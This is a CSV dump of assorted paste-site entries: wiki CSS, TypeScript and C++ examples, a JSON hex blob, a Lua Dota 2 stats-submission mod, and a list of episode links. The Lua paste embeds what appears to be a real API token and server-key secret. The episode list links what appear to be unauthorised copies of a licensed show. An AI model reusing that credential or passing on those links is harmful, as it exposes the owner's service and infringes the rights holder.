id,title,username,language,date,content
sbXDwX1C,Untitled,vuseless,HTML,Friday 11th of August 2023 06:58:42 AM CDT,strawpoll.de/y39sy4g
76pcnD9E,New CSS for Wiki-TheWest,BelleBernice,CSS,Friday 11th of August 2023 06:56:07 AM CDT,"/* HEADER AND TOP NAVIGATION */
#mirage-fixed-header {
    background-color: #c9b997;
    box-shadow: none;
}

#mirage-top-header {
    background-image: url(""/skins/MirageWest/images/page-bgtile.png"");
}

/* Respect width of logo */
img.mw-logo-icon {
    width: inherit;
}

.mw-wordmark-container span.mw-logo-wordmark {
    color: #3d2718;
}

/* Remove duplicated logo and word mark from main page */
#mirage-navigation-header #mirage-logo,
#mirage-navigation-header .mw-logo-wordmark {
    display: none;
}

.skin-mirage-dropdown-list a {
    font-weight: normal;
}

div#right-navigation {
    background-color: transparent;
}

li.mw-list-item,
li.skin-mirage-dropdown-container {
    background: #c9b997;
}

div#module-site-tools li.mw-list-item,
#module-site-tools > ul > li:last-child {
    border-color: black;
}

div.skin-mirage-dropdown-list > ul > li.mw-list-item {
    background: none;
}

/* Move wiki navigation menus to same line as logo */
div#module-site-navigation {
    margin-top: -2.5rem;
}

/* Limit space used by site navigation to avoid overlapping buttons, and move navigation to the right slightly */
div#module-site-navigation.skin-mirage-mirage-navigation {
    max-width: 70%;
    margin-left: 10px;
}

/* Move Right Navigation (edit button etc.) in line with Recent changes */
div#right-navigation {
    position: absolute;
    margin-right: 15px;
    margin-top: -1.25rem;
    right: 0px;
}

/* Recent Changes button text */
#module-site-tools > ul > li:nth-child(1) > a {
    color: #5f391a;
}

/* Edit button row hover styling */
#p-views > ul > li:hover,
#mirage-right-rail-button:hover {
    background-color: rgba(255,255,255,0.15);
    color: #404244;
    border-color: black;
}

/* Have to set this color back to transparent to ensure no text shows on the right rail button on hover */
#mirage-right-rail-button:hover {
    color: transparent;
}

/* Adjust color for Recent Changes icon */
.skin-mirage-ooui-icon-recentChanges:before {
    background-image: url(/load.php?modules=skin.mirage.icons&image=recentChanges&format=rasterized&lang=en&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E recent changes %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M1 3h16v2H1V3Zm0 6h11v2H1V9Zm0 6h7v2H1v-2Zm17.8-3.1 1-1.1a.6.6 0 0 0 0-.8L18 8.2a.6.6 0 0 0-.8 0l-1 1 2.6 2.7Zm-3.3-2L10 15.3V18h2.6l5.6-5.5-2.7-2.7Z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for Special Pages icon */
.skin-mirage-ooui-icon-specialPages:before {
    background-image: url(/load.php?modules=skin.mirage.icons&image=specialPages&format=rasterized&lang=en&skin=fallback&version=dk89p);
    background-image: linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E special pages %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath fill=%22%235f391a%22 d=%22M7 0a2 2 0 0 0-2 2h9a2 2 0 0 1 2 2v12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2z%22/%3E%3Cpath fill=%22%23fill%22 d=%22M13 20H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v13a2 2 0 0 1-2 2zm-6.5-3.5.41-1.09L8 15l-1.09-.41-.41-1.09-.41 1.09L5 15l1.09.41.41 1.09zm2.982-.949.952-2.561 2.53-.964-2.53-.964L9.482 8.5l-.952 2.562-2.53.964 2.53.964.952 2.561zM6 10.5l.547-1.453L8 8.5l-1.453-.547L6 6.5l-.547 1.453L4 8.5l1.453.547L6 10.5z%22/%3E%3C/g%3E%3C/svg%3E"")
}

/* Adjust color for Random Page icon */
.skin-mirage-ooui-icon-die:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=die&format=rasterized&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E die %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M3 1a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2zm2 16a2 2 0 1 1 2-2 2 2 0 0 1-2 2zM5 7a2 2 0 1 1 2-2 2 2 0 0 1-2 2zm5 5a2 2 0 1 1 2-2 2 2 0 0 1-2 2zm5 5a2 2 0 1 1 2-2 2 2 0 0 1-2 2zm0-10a2 2 0 1 1 2-2 2 2 0 0 1-2 2z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for three dots menu icon */
.skin-mirage-ooui-icon-ellipsis:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=ellipsis&format=rasterized&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E ellipsis %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Ccircle cx=%2210%22 cy=%2210%22 r=%222%22/%3E%3Ccircle cx=%223%22 cy=%2210%22 r=%222%22/%3E%3Ccircle cx=%2217%22 cy=%2210%22 r=%222%22/%3E%3C/g%3E%3C/svg%3E"");
}


/* Background color for Edit Button and Right Rail collapse/expand button */
#mirage-edit-button > li,
#mirage-right-rail-button {
    /* background-image: url(""/skins/MirageWest/images/page-bgtile.png""); */
    background: #c9b997;
}

/* Border color definitions for the top navigation buttons */
#mirage-edit-button > li,
#mirage-edit-button > li + li,
#mirage-edit-button > li:first-child,
#mirage-edit-button > li:last-child,
#mirage-edit-button > li:hover,
#mirage-edit-button > li + li:hover,
#mirage-edit-button > li:hover:first-child,
#mirage-edit-button > li:hover:last-child,
#mirage-right-rail-button,
#mirage-right-rail-button:focus {
    border-color: black;
}

/* Hover color for Edit button */
#mirage-edit-button > li:first-child a:hover {
    color: black;
}

/* Color for Edit button */
#mirage-edit-button > li:first-child a {
    color: #5f391a;
}

/* Adjust color for Edit icon */
.skin-mirage-ooui-icon-edit-invert:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=edit&variant=invert&format=rasterized&skin=fallback&version=dk89p);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E edit %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22m16.77 8 1.94-2a1 1 0 0 0 0-1.41l-3.34-3.3a1 1 0 0 0-1.41 0L12 3.23zM1 14.25V19h4.75l9.96-9.96-4.75-4.75z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for Watch icon */
.skin-mirage-ooui-icon-star-invert:before,#ca-watch a:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=star&variant=invert&format=rasterized&skin=fallback&version=dk89p);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E star %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M20 7h-7L10 .5 7 7H0l5.46 5.47-1.64 7 6.18-3.7 6.18 3.73-1.63-7zm-10 6.9-3.76 2.27 1-4.28L3.5 8.5h4.61L10 4.6l1.9 3.9h4.6l-3.73 3.4 1 4.28z%22/%3E%3C/g%3E%3C/svg%3E"")}

/* Adjust color for Unwatch icon */
.skin-mirage-ooui-icon-unStar-invert:before,#ca-unwatch a:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=unStar&variant=invert&format=rasterized&skin=fallback&version=dk89p);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E un-star %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M20 7h-7L10 .5 7 7H0l5.46 5.47-1.64 7 6.18-3.7 6.18 3.73-1.63-7z%22/%3E%3C/g%3E%3C/svg%3E"")}

/* Adjust color for ""More"" menu icon */
.skin-mirage-ooui-icon-indicator-down-invert:before {
    background-image:url(/load.php?modules=skin.mirage.indicators&image=down&variant=invert&format=rasterized&skin=fallback&version=1h8wn);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%2212%22 viewBox=%220 0 12 12%22%3E%3Ctitle%3E down %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M9.9 2.9 6 6.8 2.1 2.9 1 4l5 5 5-5z%22/%3E%3C/g%3E%3C/svg%3E"");
}

/* Adjust color for Right Rail button icon */
.skin-mirage-ooui-icon-doubleChevronEnd:before {
    background-image:url(/load.php?modules=skin.mirage.icons&image=doubleChevronEnd&format=rasterized&lang=en&skin=fallback&version=14jep);
    background-image:linear-gradient(transparent,transparent),url(""data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 20 20%22%3E%3Ctitle%3E double chevron start %3C/title%3E%3Cg fill=%22%235f391a%22%3E%3Cpath d=%22M11 2 9.7 3.3l6.6 6.7-6.6 6.7L11 18l8-8zM2.5 2 1 3.3 7.8 10l-6.7 6.7L2.5 18l8-8z%22/%3E%3C/g%3E%3C/svg%3E"");
}


/* Hide the editLock icon that doesn't want to be edited for some unexplainable reason */
.skin-mirage-ooui-icon-editLock-invert:before {
    display: none;
}

/* Dropdown list for history, deletion, protection etc. */
li#ca-history,
li#ca-delete,
li#ca-move,
li#ca-protect {
    background: none;
}

/* Remove Main Page header from Main page */
body.page-Main_Page .mw-page-title-main {
    display: none;
}


/* Remove the Page and Discussion buttons from all pages */
div#left-navigation nav#p-namespaces {
    display: none;
}

#module-page-navigation {
    margin: 0;
}


/* Styling of username when logged in / don't show username */
#mirage-fixed-header .skin-mirage-username {
    color: orange;
    display: none;
}

/* Styling for background of dropdown on username/not logged in */
.skin-mirage-personaltools-dropdown li {
    background: none;
}

/* Text color of dropdown on username/not logged in */
li#pt-login {
    color: black;
}

/* Text color on dropdown when no new messages */
.skin-mirage-no-new-messages {
    color: black;
}

/* Main background */
body {
    background-attachment: fixed;
    background-image:
        url(""/skins/MirageWest/images/bg-cover-right.png""),
        url(""/skins/MirageWest/images/bg-cover-left.png""),
        url(""/skins/MirageWest/images/bg-cover-bottom.png""),
        url(""https://wiki.the-west.net/images/d/d5/NewMainBg.jpg"");
    background-position: right center,left center,center bottom,center center;
    background-size: auto,auto,auto,cover;
    background-repeat: repeat-y,repeat-y,repeat-x,no-repeat;
}

/* GENERAL ARTICLE STYLING */
main#content.mw-body,
main#content.mw-body-content,
#mirage-navigation-header,
#module-page-navigation,
.skin-mirage-content-container {
    background-image: url(""/skins/MirageWest/images/page-bgtile.png"");
}

p,
h1,
h2,
h3,
h4,
h5,
h6,
li,
i {
    color: #3d2718;
}

h1,
h2,
.skin-mirage-right-rail-module h3,
hr {
    border-color: #a6805a;
}


p a,
p a:visited,
li a,
li a:visited {
    color: #3d2718;
    font-weight: bold;
}

p a:hover {
    color: #3d2718;
}

 /* Warning on MediaWiki:Custom.css page */
.mw-editinginterface {
    color: #3d2718;
}

/* Table of Contents styling */
.toc {
    background-color: #c9b997;
}

.toc h2 {
    color: black;
}

.toc li a,
.toc li a:visited,
.toctogglelabel {
    color: #5f391a;
}


/* In-article edit icon styling */
a.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small,
a:visited.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
    color: #3d2718;
}

a:hover.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
    color: #3d2718;
}


/* TABLE STYLING */
table th {
    font-weight: normal;
    background-color: #b99968;
    color: #5e321a;
    padding: 10px;
}

/* Special .announcement class table on the Main Page */
th.announcement {
    font-weight: bold;
}

table td .announcement {
    color: #5e321a;
}

table td,
table th {
    text-align: center;
    padding: 5px;
    box-shadow: 0px 0px 1px 1px rgba(255,255,255,0.1) inset;
    background-color: #d4ba91 !important;
}

td,
th {
    padding: 0;
}

td {
    display: table-cell;
    vertical-align: inherit;
}

table {
    display: table !important;
    width: 100%;
    border-collapse: separate;
    border-spacing: 1px !important;
    margin-bottom: 4px;
    border-radius: 3px;
}

table center {
    color: #5e321a;
}

table a,
table a:visited {
    color: #3d2718;
}

table a:hover {
    color: #1480a4;
}

/* RIGHT RAIL STYLING */
#mirage-right-rail {
    background-image: url(""/skins/MirageWest/images/page-bgtile.png"");
}

#mirage-right-rail a,
#mirage-right-rail a:visited {
    color: #3d2718;
}

#mirage-right-rail a:hover {
    color: #3d2718;
}

/* Remove background color on Page tools section of Right Rail */
.skin-mirage-module-body ul.skin-mirage-unstyled-list > li {
    background: none;
}


/* FOOTER STYLING */
footer {
    display: grid;
    align-content: center;
    justify-content: center;
    justify-items: center;
    margin-top: -25px;
}

footer.mw-footer {
    background-color: transparent;
    box-shadow: none;
    align-content: center;
}

#footer-info-lastmod,
#footer-info-copyright,
#footer-places-privacy,
#footer-places-about,
#footer-places-disclaimer {
    display: inline-block;
    margin-right: 15px;
}

footer ul.skin-mirage-unstyled-list#footer-info {
    margin-right: 0px;
    color: #c9b997;
    text-shadow: 1px 1px 1px black;
}

div#footer-places {
    margin-right: auto;
    margin-left: auto;
}

.mw-footer p,
.mw-footer h3 {
    color: black;
}

.mw-footer a {
    color: #c9b997;
    font-weight: normal;
}

.mw-footer a:hover {
    color: #c9b997;
}

.mw-footer li {
    line-height: 1 !important;
}

div#footer-places {
    margin-left: initial;
}

h3#footer-places-label {
    display: none;
}

li#footer-info-lastmod {
    color: #c9b997;
}

/*Table of contents title*/
#mw-toc-heading {
background: transparent;
}

/*The dropdown top menus should be displayed above some of the custom headers from West*/
.skin-mirage-mirage-navigation .skin-mirage-navigation-entry-item .skin-mirage-dropdown-list {
z-index: 101;
}

/*More West-like border of the table of contents*/
.toc {
border: 1px solid #996b39;
}

/*Remove the title of the page. Unnecessary, and looks out of place.*/
.mw-wordmark-container span.mw-logo-wordmark {
display: none;
}

/*Background for the top bar*/
#mirage-fixed-header {
background-image: url(""/skins/MirageWest/images/headline-bgtile.png"");
}

/*Don't show username, or 'not logged in' in the top bar*/
#mirage-fixed-header .skin-mirage-username {
display: none;
}

/*Don't show site notice - the thing with the side menu used in the old version of the wiki*/
#siteNotice {
display: none;
}


/*Make 'edit' link visible again*/
a.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
color: #ccc;
}

h3 a.skin-mirage-ooui-icon.skin-mirage-ooui-icon-edit.skin-mirage-ooui-icon-small {
color: #804000;
}

/*Faint border around the main content*/
.mediawiki-content-container {
border-left: 2px solid #996b39;
border-right: 2px solid #996b39;
border-bottom: 2px solid #996b39;
}

#mirage-top-header {
border-left: 2px solid #996b39;
border-right: 2px solid #996b39;
border-top: 2px solid #996b39;
}

#left-navigation, #right-navigation, #left-navigation nav, #right-navigation nav, #left-navigation label, #right-navigation label {
padding-right: 5px;
}

/*Make the semantic media wiki readable*/
.smw-editpage-help {
background-color: #565656;
}

/* Make the errors on uploading the same file readable */
.mw-destfile-warning {
color: #5e321a;
}

.externalimage-holder {
position: relative;
margin: auto;
display: inline-block;
max-width: 600px;
}
.externalimage-holder img {
width: 100%;
height: auto;
}
img {
max-width: 900px;
}

#document-wrapper
{
max-width: 1200px;
}



/* West specific changes */
/* Correct button sizes for save buttons of articles */
#wpSave,
#wpPreview,
#wpDiff {
    width: initial;
}

/* Adjust image size on Main Page slightly so it cannot go outside of bounds */
body.page-Main_Page .container-title,
body.page-Huvudsida .container-title,
body.page-Forside .container-title {
    width: initial;
}

/* Mobile-specific changes */
@media screen and (max-width: 720px)
{
/* Remove the unnecessary logo next to the navigation links */
#mirage-navigation-header #mirage-logo {
   display: none;
}

/*Remove the wiki title on mobile*/
.mw-logo-wordmark {
   display: none;
}

/*Set max image size on mobile, so they scale*/
img {
  display: block;
  max-width:90%;
  width: auto;
  height: auto;
}

/* Remove text of Recent Changes button */
div#module-site-tools li.mw-list-item:first-child a {
    color: transparent;
}

/* Avoid right-floating images to overlap text or take too much space on Mobile */
div.tright,
div.floatright,
table.floatright {
    clear: right;
    float: unset;
}
}

/* Remove overlay popup */
.overlay-popup {
display: none;
}
"
0CYK1cEL,Facade,Idanref,TypeScript,Friday 11th of August 2023 06:20:21 AM CDT,"class CPU {
  start(): void {
    console.log(""CPU started"");
  }
}

class Memory {
  load(position: number, data: string): void {
    console.log(`Loading data ${data} at position ${position}`);
  }
}

class HardDrive {
  read(position: number, size: number): string {
    console.log(`Reading ${size} data from position ${position}`);
    return ""data"";
  }
}

// Facade: This is the class that simplifies the interface to the subsystems.
class Computer {
  private cpu: CPU;
  private memory: Memory;
  private hardDrive: HardDrive;

  constructor() {
    this.cpu = new CPU();
    this.memory = new Memory();
    this.hardDrive = new HardDrive();
  }

  start(): void {
    this.cpu.start();
    const data = this.hardDrive.read(1000, 200);
    this.memory.load(0, data);
    console.log(""Computer started"");
  }
}

// Client Code: The client interacts with the subsystems through the simplified interface provided by the facade.
const computer = new Computer();
computer.start();
// Output:
// CPU started
// Reading 200 data from position 1000
// Loading data data at position 0
// Computer started"
kNrisFDQ,data661,TestGuy1,JSON,Friday 11th of August 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9ec7bce836fb8195269ba11ae64eaa30dc0d5128333d126216476ddce1085cbd41ad0e58a636e7de7a100e36f4fa13d30b9a6e7d8c8eba8b5b7c7a4ffab6fae5191b476ad632806c521de56ac8f39f7e054745098d550f97390e1d20cea17f3750728e1b75660ee8c7e9145117002cd714d559a15430b3243ab5f7837849fbd2',
  otherdata: [
    '41a0ffa8b8c130048e2909676c1efdb5',
    '7a941fec7a4d7da1f534ae855db075cf',
    'dd7c4f07159b22ce66fc4d823991e9d6',
    '18d1bbab283e55062841917d1504f3f4',
    '678d872daa32a9eeb00ef142578a0ecc',
    '2b97f0d5bf4af99800e6c3b4bfa3e105',
    '9bc8f59af51c8ca36ac39a5f0895b81f',
    'fc505eceef160473f485c99e52cb5829'
  ]
}"
k6ETnnys,Обращение к элементу массива,Mauzzz0,TypeScript,Friday 11th of August 2023 05:26:46 AM CDT,"const clients = [{id: 1, name: '100'}, {id: 2, name: '200'}];

const findFirstClient = (arr: typeof clients) => {
    return arr[0];
}

const firstClient = findFirstClient(clients);

firstClient.name = 'one';

console.log(clients);

const firstClientAlternative = clients[0];

firstClientAlternative.name = 'two';

console.log(clients);
"
DrbjABzy,EXO Ladder 4,ktvchains,Perl,Friday 11th of August 2023 05:18:15 AM CDT,"# EN, 1080p
# I'll try to update this on Fridays, as people have requested 1080p links, but there might be delays, since it's not a priority.
# Subtitles (KOCOWA release): https://subscene.com/subtitles/exos-travel-the-world-on-a-ladder-in-geoje-and-tongyeong-travel-the-world-on-exos-ladder-season-4-exo-4
 
# E2 230811
[!ads] watch: https://filemoon.sx/d/jmql5fhinklj
[!ads] download: https://www.europeup.com/vys51hg3gopw/exol4_e2_1080p_kcw.mp4

# E1 230811
[!ads] watch: https://filemoon.sx/d/ju84ijs5bbx2
[!ads] download: https://www.europeup.com/iey3q37g7ew1/exol4_e1_1080p_kcw.mp4"
fXWq31VF,DotaN Stats,Enkada,Lua,Friday 11th of August 2023 05:14:22 AM CDT,"require(""stats"")

function CAddonTemplateGameMode:InitGameMode()
	-- [Your code]
	
	-- Sends dedicated key to the server
	-- Comment out this line once key is received and set on server side
	Stats.SendKey()

	-- Listens to an event, that occurs when one of the team's anicent gets destroyed
	-- and submits match data via HTTP POST request
	ListenToGameEvent('dota_match_done', function(keys)
		Stats.SubmitMatch(keys.winningteam)
    end, nil)
end


-- 
-- File [stats.lua]
--

Stats = class({})

Stats.host = ""https://dotan.enkada.ru/api/match/add.php""
Stats.key = GetDedicatedServerKey(""FaPaH002"")

Stats.token = ""O=X97Pq-NnZ4rTY9GYa1!Dq7IUbltZY38apSJa7LC-ISvfE/qf8T6OO/VviCEUJx""

-- Submits match data using POST HTTP request
function Stats.SubmitMatch(winningteam, callback)
	print(""[STATS] Attempt to submit match"")

	local data = {
		matchID = tostring(GameRules:Script_GetMatchID()), -- Returns zero in dev mode
		duration = math.floor(GameRules:GetGameTime() + 0.5),
        winner = winningteam, -- DOTA_TEAM_GOODGUYS = 2, DOTA_TEAM_BADGUYS = 3
		players = GetPlayerList(),
        token = Stats.token
		-- key = Stats.key
	}

    --print(""Post data JSON:"", json.encode(data))

	local req = CreateHTTPRequestScriptVM(""POST"", Stats.host)

    if req == nil then
        print(""[STATS] Failed to create http request"")
	end

	req:SetHTTPRequestGetOrPostParameter('data', json.encode(data))

    req:Send(function(res)
        if res.StatusCode ~= 200 then
            print(""[STATS] Server connection failure, code"", res.StatusCode)
            return
        end

		print(""[STATS] Received"", res.Body)
		local obj, pos, err = json.decode(res.Body)
    end)
end

-- Sends dedicated server key
-- Only used on the first setup and when secret string for Stats.key changes
function Stats.SendKey()
	local data = {
		key = Stats.key
	}

	local req = CreateHTTPRequestScriptVM(""POST"", Stats.host)

    if req == nil then
        print(""[STATS] Failed to create http request"")
	end

	req:SetHTTPRequestGetOrPostParameter('dedicated_key', json.encode(data))

    req:Send(function(res)
        if res.StatusCode ~= 200 then
            print(""[STATS] Server connection failure, code"", res.StatusCode)
            return
        end

		print(""[STATS] Server key sent"", res.Body)
    end)
end

-- Creates an array of players
-- steamName returns an empty string
-- TODO: add tower damage
function GetPlayerList()
    local players = {}
    for playerID = 0, DOTA_MAX_PLAYERS do
        if PlayerResource:IsValidPlayerID(playerID) then
            if not PlayerResource:IsBroadcaster(playerID) then

                table.insert(players, {
                    steamID32 = PlayerResource:GetSteamAccountID(playerID),
                    steamID64 = tostring(PlayerResource:GetSteamID(playerID)), 
					playerName = PlayerResource:GetPlayerName(playerID), -- Empty for some reason
					team = PlayerResource:GetTeam(playerID) - 2,
					hero = string.gsub(PlayerResource:GetSelectedHeroName(playerID), ""npc_dota_hero_"", """"),
					items = GetItemList(PlayerResource:GetSelectedHeroEntity(playerID)),
					networth = PlayerResource:GetNetWorth(playerID),
					kills = PlayerResource:GetKills(playerID),
					deaths = PlayerResource:GetDeaths(playerID),
					assists = PlayerResource:GetAssists(playerID),
					gpm = PlayerResource:GetGoldPerMin(playerID),
					xpm = PlayerResource:GetXPPerMin(playerID),
					level = PlayerResource:GetLevel(playerID),
					level = PlayerResource:GetLevel(playerID),
					lastHits = PlayerResource:GetLastHits(playerID),
					denies = PlayerResource:GetDenies(playerID),
					damage = PlayerResource:GetRawPlayerDamage(playerID),
					healing = PlayerResource:GetHealing(playerID)
                })
            end
        end
    end

    return players
end

-- Creates an item array by hero
function GetItemList(hero)
    local itemTable = {}

    for i = 0, 5 do
        local item = hero:GetItemInSlot(i)
        if item then
            local itemName = string.gsub(item:GetAbilityName(), ""item_"", """") -- Cuts the item_ prefix
            table.insert(itemTable, itemName)
        end
    end

    return itemTable
end"
RHYUrCx5,Untitled,Gosunov,C++,Friday 11th of August 2023 05:07:58 AM CDT,"#include <bits/stdc++.h>
using namespace std;
#define set _set
 
const int maxn = 1000000000;
char p[maxn / 16 + 1];
 
void set(int x) {
    x >>= 1;
    p[x / 8] |= '\1' << (x % 8); 
}
 
bool get(int x) {
    x >>= 1;
    return !((p[x / 8] >> (x % 8)) & 1);
}
 
void build() {
    for (int i = 3; i * i < maxn; i += 2) {
        if (!get(i))
            continue;
        for (int j = i * i; j < maxn; j += (i << 1)) {
            set(j);
        }
    }
}
 
bool is_prime(int x) {
    if (x == 2) return true;
    if ((x & 1) == 0) return false;
    return get(x);
}
 
void solve() {
    int primes = 0;
    for (int i = 1; i < maxn; ++i)
        primes += is_prime(i);
    cout << primes << '\n';
}
 
signed main() {
    build();
    solve();
}"
rUnYpK7i,ADSAF,Salvens,C++,Friday 11th of August 2023 05:05:05 AM CDT,"#include <map>
#include <set>
#include <cmath>
#include <queue>
#include <stack>
#include <bitset>
#include <cstdio>
#include <random>
#include <vector>
#include <fstream>
#include <iomanip>
#include <numeric>
#include <iostream>
#include <algorithm>
#include <unordered_set>
#include <unordered_map>

using namespace std;

#define int long long

const int C = 20;
const int MAXN = (int)1e6 + 5;
const long long INF = (long long)1e18;
const double PI = 3.1415926535897;
const int k = 1000003, mod = 1e9 + 7, mod1 = 228228227;
vector<int> h(MAXN), h1(MAXN), rh(MAXN), rh1(MAXN), p(MAXN), p1(MAXN);

int mul(int a, int b) {
    return a * b % mod;
}

int minu(int a, int b) {
    if (a >= b) {
        return a - b;
    } else {
        return a - b + mod;
    }
}

int mul1(int a, int b) {
    return a * b % mod1;
}

int minu1(int a, int b) {
    if (a >= b) {
        return a - b;
    } else {
        return a - b + mod1;
    }
}

int get(int l, int r) {
    return minu(h[r], mul(h[l], p[r - l]));
}

int get1(int l, int r) {
    return minu1(h1[r], mul1(h1[l], p[r - l]));
}

int rget(int l, int r) {
    return minu(rh[r], mul(rh[l], p[r - l]));
}

int rget1(int l, int r) {
    return minu1(rh1[r], mul1(rh1[l], p[r - l]));
}

void solve() {
    int n, m;
    cin >> n >> m;
    vector<int> a(n);
    for (int &i : a) {
        cin >> i;
    }
    h1[0] = 0;
    h[0] = 0;
    rh[0] = 0;
    rh1[0] = 0;
    for (int i = 0; i < a.size(); ++i) {
        h[i + 1] = (mul(h[i], k) + a[i]) % mod;
        rh[i + 1] = (mul(rh[i], k) + a[a.size() - i - 1]) % mod;
        h1[i + 1] = (mul1(h1[i], k) + a[i]) % mod1;
        rh1[i + 1] = (mul1(rh1[i], k) + a[a.size() - i - 1]) % mod1;
    }

    vector<int> ans = {n};
    for (int i = 1; i <= n / 2; ++i) {
//        cout << i << endl;
//        cout << get(0, i) << ' ' << rget(n - 2 * i, n - i) << '\n';
//        cout << mul(get(0, i), p[n - i]) << ' ' << mul(rget(n - 2 * i, n - i), p[i]) << ' ' << mul1(get1(0, i), p[n - i]) << ' ' << mul1(rget1(n - 2 * i, n - i), p[i]) << '\n';
        if (get(0, i) == rget(n - 2 * i, n - i) && get(0, i) == rget(n - 2 * i, n - i)) {
            ans.emplace_back(n - i);
        }
    }
    sort(ans.begin(), ans.end());
    for (int i : ans) {
        cout << i << ' ';
    }
}

int32_t main() {
//    freopen(""input.txt"", ""r"", stdin);
//    freopen(""output.txt"", ""w"", stdout);
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    p[0] = 1;
    for (int i = 1; i < MAXN; ++i) {
        p[i] = (p[i - 1] * k) % mod;
    }
    int ttt = 1;
    //cin >> ttt;
    while (ttt--) {
        solve();
    }
    return 0;
}"
